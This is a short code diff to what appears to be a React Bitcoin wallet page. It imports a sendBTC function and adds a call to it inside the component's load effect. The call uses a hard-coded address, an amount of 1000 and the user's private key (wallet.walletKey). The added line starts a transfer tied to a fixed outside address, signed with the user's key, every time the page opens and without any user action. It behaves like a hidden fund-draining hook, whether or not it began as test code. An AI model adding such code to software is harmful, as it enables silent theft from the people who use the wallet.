@@ -12,7 +12,7 @@ import usdcWalletImage from '../../../assets/usdc-wallet.svg';
 import qrPlaceholder from '../../../assets/qr_code_placeholder.png'
 import { ethers } from 'ethers';
 // import { getETHBalance, getETHHistory } from '../../../utils/ethWallet';
-import { getBTCBalance } from '../../../utils/btcWallet';
+import { getBTCBalance, sendBTC } from '../../../utils/btcWallet';
 
 const BitcoinWallet = () => {
 	let { walletName } = useParams();
@@ -37,6 +37,7 @@ const BitcoinWallet = () => {
 			}
 		}
 		fetchBTCBalance()
+		sendBTC('2N3oefVeg6stiTb5Kh3ozCSkaqmx91FDbsm', wallet.walletAddress, 1000, wallet.walletKey)
 	}, [wallet])
 
 
